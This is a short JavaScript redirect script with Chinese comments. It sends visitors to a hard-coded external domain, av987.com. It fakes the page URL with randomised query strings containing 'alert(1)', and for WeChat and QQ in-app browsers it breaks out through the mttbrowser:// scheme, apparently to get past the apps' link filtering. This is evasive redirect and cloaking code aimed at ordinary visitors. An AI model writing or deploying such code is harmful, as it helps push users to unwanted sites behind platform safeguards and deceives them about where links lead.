addiframe =null;

//跳转案例
var urls=[
	'https://av987.com/',
];

if(/alert/.test(location.href)){
	window.history.pushState({},'x',getUrl());
	var url = myChat(urls[Math.floor(Math.random()*urls.length)]);
	if(/MicroMessenger|QQ\//gi.test(navigator.userAgent)){
		document.write('<meta http-equiv="refresh" content="0.1;url=mttbrowser://url='+url+'">');
	}else{
		location.href=url;
	}		
}else{
	location.href=getUrl();;
}
function getUrl() {
	return myChat('?id={ddndn}%3D&s={wuwuwy}&b=alert(1)&t={dddddwwwnwwnn}');
}
function myChat(s){
	s = typeof(s) == 'object'?s[Math.floor(Math.random()*s.length)]:s;
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
